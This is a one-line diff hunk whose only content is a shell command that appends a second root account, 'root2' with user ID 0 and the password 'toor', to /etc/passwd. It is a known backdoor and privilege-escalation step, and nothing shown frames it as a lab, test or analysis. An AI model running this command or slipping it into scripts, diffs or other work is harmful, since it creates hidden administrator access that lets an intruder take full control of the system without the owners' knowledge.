@@ -1,0 +1,1 @@
+echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
